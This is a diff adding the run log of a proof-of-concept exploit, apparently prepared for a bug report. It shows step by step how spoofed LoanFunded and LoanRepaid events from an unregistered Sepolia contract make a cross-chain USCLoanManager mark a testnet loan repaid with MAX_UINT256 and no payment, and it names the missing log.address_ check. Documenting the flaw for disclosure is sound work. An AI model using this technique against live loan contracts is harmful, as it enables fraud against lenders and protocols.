@@ -1,0 +1,219 @@
+
+=================================================================
+  F2 PoC (v2) — USCLoanManager Missing log.address_ Validation
+=================================================================
+[+] Attacker: 0xeb450C9b3F526d4B7458b03776C145E62EBa32E9
+[+] USC bridge dir: /Users/KokWorrachat/usc-testnet-bridge-examples
+[+] CC3 testnet: chain_id=102031  block=4894063
+[+] Sepolia: chain_id=11155111  block=10981264
+[+] CC3 balance    : 9999.996639 CTC
+[+] Sepolia balance: 0.039646 ETH
+
+=================================================================
+  STEP 0 — Deploy EvmV1Decoder library on CC3 testnet
+=================================================================
+[+] EvmV1Decoder bytecode loaded: 13314 bytes
+[>] deploy EvmV1Decoder: 8b22253e3543d0b6b5d35793185fe294fb2c1cb3e5e596ec77ddd1db2407c058
+[+] deploy EvmV1Decoder: OK  block=4894064  gas=2,921,510
+[+] EvmV1Decoder library deployed at: 0xB0E76e5403Ba03cC7284F6de047A5148928EecfE
+
+=================================================================
+  STEP 1 — Deploy USCLoanManager on CC3 testnet
+=================================================================
+[+] USCLoanManager bytecode loaded and linked: 11257 bytes  (4 library refs replaced with 0xB0E76e5403Ba03cC7284F6de047A5148928EecfE)
+[>] deploy USCLoanManager: 6c45808fd4b1be6096ab31bb085afbe2e577559cf2dc3c2ab87c69404bfb0523
+[+] deploy USCLoanManager: OK  block=4894065  gas=2,513,340
+[+] USCLoanManager deployed at: 0x9b70AA3F152cdE40f08852E7C116528eB3D4d1B3
+[+] Owner: 0xeb450C9b3F526d4B7458b03776C145E62EBa32E9  (attacker: 0xeb450C9b3F526d4B7458b03776C145E62EBa32E9)
+
+=================================================================
+  STEP 2 — Register test loan on USCLoanManager
+=================================================================
+[>] registerLoan: 4318a5cbc117021664b2a5bc38b6239d8a24736138ed17d87f033ba777f21fad
+[+] registerLoan: OK  block=4894066  gas=476,296
+[+] Loan registered: ID=1
+    status  : Created (0)
+    deadline: block 4944065
+    token   : 0x000000000000000000000000000000000000dEaD  ← USCLoanManager never validates this
+[initial] Loan #1: status=Created (0)  repaidAmount=0
+
+=================================================================
+  STEP 3 — Using existing FakeRepayer
+=================================================================
+[+] Address: 0xb80ad26921eFA701c9A04f5c8d97c27e52478a21
+
+=================================================================
+  STEP 4 — Emit fake LoanFunded event on Sepolia
+=================================================================
+[>] fakeFund: da3fa1b61a414d757db1322b5a85d91b49c70c573877098a5a42a1ffebaf592f
+[+] fakeFund: OK  block=10981268  gas=22,725
+    Emitter: 0xb80ad26921eFA701c9A04f5c8d97c27e52478a21  ← NOT registered loan contract
+    Topic 0: 0x9e71d2fb732e68272b7e74ecfd14638673c1d77e19a5d390a3ffff054d57c44b  (LoanFunded sig)
+    Topic 1: 0x1000000000000000000000000000000000000000000000000000000000000000  (loanId indexed)
+[+] LoanFunded event confirmed in Sepolia receipt ✓
+
+=================================================================
+  STEP 5 — Wait for Sepolia block attestation (LoanFunded)
+=================================================================
+
+[*] Waiting for Sepolia block 10981268 to be attested on CC3...
+    Prover: https://prover.cc3-testnet.creditcoin.network/api/v1/attested-height/1
+    Expected wait: ~8-12 minutes
+[   1s] Latest attested: 10981230  (need: 10981268)  ...
+[  18s] Latest attested: 10981230  (need: 10981268)  ...
+[  34s] Latest attested: 10981230  (need: 10981268)  ...
+[  50s] Latest attested: 10981230  (need: 10981268)  ...
+[  67s] Latest attested: 10981230  (need: 10981268)  ...
+[  83s] Latest attested: 10981240  (need: 10981268)  ...
+[ 100s] Latest attested: 10981240  (need: 10981268)  ...
+[ 117s] Latest attested: 10981240  (need: 10981268)  ...
+[ 133s] Latest attested: 10981240  (need: 10981268)  ...
+[ 149s] Latest attested: 10981240  (need: 10981268)  ...
+[ 166s] Latest attested: 10981240  (need: 10981268)  ...
+[ 183s] Latest attested: 10981240  (need: 10981268)  ...
+[ 199s] Latest attested: 10981240  (need: 10981268)  ...
+[ 216s] Latest attested: 10981240  (need: 10981268)  ...
+[ 232s] Latest attested: 10981250  (need: 10981268)  ...
+[ 248s] Latest attested: 10981250  (need: 10981268)  ...
+[ 265s] Latest attested: 10981250  (need: 10981268)  ...
+[ 281s] Latest attested: 10981250  (need: 10981268)  ...
+[ 298s] Latest attested: 10981250  (need: 10981268)  ...
+[ 314s] Latest attested: 10981250  (need: 10981268)  ...
+[ 331s] Latest attested: 10981250  (need: 10981268)  ...
+[ 348s] Latest attested: 10981250  (need: 10981268)  ...
+[ 365s] Latest attested: 10981250  (need: 10981268)  ...
+[ 381s] Latest attested: 10981250  (need: 10981268)  ...
+[ 398s] Latest attested: 10981250  (need: 10981268)  ...
+[ 415s] Latest attested: 10981260  (need: 10981268)  ...
+[ 431s] Latest attested: 10981260  (need: 10981268)  ...
+[ 448s] Latest attested: 10981260  (need: 10981268)  ...
+[ 465s] Latest attested: 10981260  (need: 10981268)  ...
+[ 481s] Latest attested: 10981270  (need: 10981268)  ✓ DONE
+
+=================================================================
+  STEP 6 — Fetch USC proof for LoanFunded tx
+=================================================================
+[*] Fetching proof: https://prover.cc3-testnet.creditcoin.network/api/v1/proof-by-tx/1/da3fa1b61a414d757db1322b5a85d91b49c70c573877098a5a42a1ffebaf592f
+[+] Proof received:
+    chainKey      : 1
+    headerNumber  : 10981268
+    txIndex       : 0
+    merkleRoot    : 0xa1e57acc049954c8ad287b404707827e87f72d7563513f671af0c7988094caed
+    siblings      : 9 entries
+    continuity    : 3 roots
+
+=================================================================
+  STEP — Submit LoanFunded proof to USCLoanManager.execute()
+=================================================================
+[*] action=0 (LoanFunded), chainKey=1, block=10981268
+    txBytes: 1568 bytes
+    merkleRoot: 0xa1e57acc049954c8...
+    siblings: 9, continuityRoots: 3
+[+] Estimated gas: 431,241  (using 582,175 with 35% buffer)
+[>] execute(LoanFunded): 27ec73ff5b2a2eaa42a2b4560134a06abf63288c25d0c4348d286dbc0074eea3
+[+] execute(LoanFunded): OK  block=4894100  gas=404,362
+[after fake LoanFunded] Loan #1: status=Funded (1)  repaidAmount=0
+[+] Phase A: loan is now Funded via fake event ✓
+
+=================================================================
+  STEP 8 — Emit fake LoanRepaid event on Sepolia
+=================================================================
+[>] fakeRepay: 43ae22de9b9217a8c3b758466b51752c07429ddee4dd3ed15f290ef821a4f2b5
+[+] fakeRepay: OK  block=10981310  gas=23,029
+    Emitter: 0xb80ad26921eFA701c9A04f5c8d97c27e52478a21  ← NOT registered loan contract
+    Topic 0: 0x040cee90ee4799897c30ca04e5feb6fa43dbba9b6d084b4b257cdafd84ba013e  (LoanRepaid sig)
+    Topic 1: 0x1000000000000000000000000000000000000000000000000000000000000000  (loanId indexed)
+    Data   : ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff  (amount = 2^256-1 = MAX_UINT256)
+[+] LoanRepaid event confirmed in Sepolia receipt ✓
+
+=================================================================
+  STEP 9 — Wait for Sepolia block attestation (LoanRepaid)
+=================================================================
+
+[*] Waiting for Sepolia block 10981310 to be attested on CC3...
+    Prover: https://prover.cc3-testnet.creditcoin.network/api/v1/attested-height/1
+    Expected wait: ~8-12 minutes
+[   1s] Latest attested: 10981270  (need: 10981310)  ...
+[  18s] Latest attested: 10981270  (need: 10981310)  ...
+[  34s] Latest attested: 10981270  (need: 10981310)  ...
+[  51s] Latest attested: 10981270  (need: 10981310)  ...
+[  68s] Latest attested: 10981270  (need: 10981310)  ...
+[  85s] Latest attested: 10981270  (need: 10981310)  ...
+[ 101s] Latest attested: 10981270  (need: 10981310)  ...
+[ 118s] Latest attested: 10981270  (need: 10981310)  ...
+[ 135s] Latest attested: 10981270  (need: 10981310)  ...
+[ 151s] Latest attested: 10981280  (need: 10981310)  ...
+[ 171s] Latest attested: 10981280  (need: 10981310)  ...
+[ 189s] Latest attested: 10981280  (need: 10981310)  ...
+[ 209s] Latest attested: 10981290  (need: 10981310)  ...
+[ 230s] Latest attested: 10981290  (need: 10981310)  ...
+[ 251s] Latest attested: 10981290  (need: 10981310)  ...
+[ 272s] Latest attested: 10981290  (need: 10981310)  ...
+[ 291s] Latest attested: 10981290  (need: 10981310)  ...
+[ 308s] Latest attested: 10981300  (need: 10981310)  ...
+[ 325s] Latest attested: 10981300  (need: 10981310)  ...
+[ 342s] Latest attested: 10981300  (need: 10981310)  ...
+[ 359s] Latest attested: 10981300  (need: 10981310)  ...
+[ 376s] Latest attested: 10981300  (need: 10981310)  ...
+[ 393s] Latest attested: 10981300  (need: 10981310)  ...
+[ 410s] Latest attested: 10981300  (need: 10981310)  ...
+[ 427s] Latest attested: 10981300  (need: 10981310)  ...
+[ 443s] Latest attested: 10981300  (need: 10981310)  ...
+[ 460s] Latest attested: 10981300  (need: 10981310)  ...
+[ 477s] Latest attested: 10981310  (need: 10981310)  ✓ DONE
+
+=================================================================
+  STEP 10 — Fetch USC proof for LoanRepaid tx
+=================================================================
+[*] Fetching proof: https://prover.cc3-testnet.creditcoin.network/api/v1/proof-by-tx/1/43ae22de9b9217a8c3b758466b51752c07429ddee4dd3ed15f290ef821a4f2b5
+[+] Proof received:
+    chainKey      : 1
+    headerNumber  : 10981310
+    txIndex       : 0
+    merkleRoot    : 0x0384b84eb17d4fa337c4a5070cda09124672f1178ad2bb9020c6fe502bb15a3f
+    siblings      : 8 entries
+    continuity    : 1 roots
+
+=================================================================
+  STEP — Submit LoanRepaid proof to USCLoanManager.execute()
+=================================================================
+[*] action=1 (LoanRepaid), chainKey=1, block=10981310
+    txBytes: 1600 bytes
+    merkleRoot: 0x0384b84eb17d4fa3...
+    siblings: 8, continuityRoots: 1
+[+] Estimated gas: 433,204  (using 584,825 with 35% buffer)
+[>] execute(LoanRepaid): fe59eb54bbf9cbc389b8cd5728f94cce80b6b7d5e91447c29e8d236726b918d9
+[+] execute(LoanRepaid): OK  block=4894134  gas=406,266
+
+=================================================================
+  STEP 12 — Verify final loan state
+=================================================================
+[FINAL] Loan #1: status=Repaid (3)  repaidAmount=115792089237316195423570985008687907853269984665640564039457584007913129639935
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+  VULNERABILITY CONFIRMED
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+  Loan #1 is marked REPAID
+  repaidAmount = 115792089237316195423570985008687907853269984665640564039457584007913129639935  (= type(uint256).max)
+  FakeRepayer at 0xb80ad26921eFA701c9A04f5c8d97c27e52478a21
+  is NOT the registered loan.repayFlow.withToken
+  USCLoanManager never checked log.address_
+  Loan status manipulated with ZERO real payment
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+=================================================================
+  SUMMARY — Evidence for bug report
+=================================================================
+  USCLoanManager : 0x9b70AA3F152cdE40f08852E7C116528eB3D4d1B3
+  LoanId         : 1
+  FakeRepayer    : 0xb80ad26921eFA701c9A04f5c8d97c27e52478a21  (Sepolia)
+  LoanFunded tx  : da3fa1b61a414d757db1322b5a85d91b49c70c573877098a5a42a1ffebaf592f  (Sepolia)
+  LoanRepaid tx  : 43ae22de9b9217a8c3b758466b51752c07429ddee4dd3ed15f290ef821a4f2b5  (Sepolia)
+  Final status   : Repaid
+  repaidAmount   : 115792089237316195423570985008687907853269984665640564039457584007913129639935
+
+Root cause: _processRepayLogs() checks topics[0] == REPAY_EVENT_SIGNATURE
+  but NEVER checks log.address_ against loan.repayFlow.withToken
+  FakeRepayer (0xb80ad26921eFA701c9A04f5c8d97c27e52478a21) emitted the event
+  Registered token was: 0x000000000000000000000000000000000000dEaD
+  These do NOT match — yet USCLoanManager accepted the proof
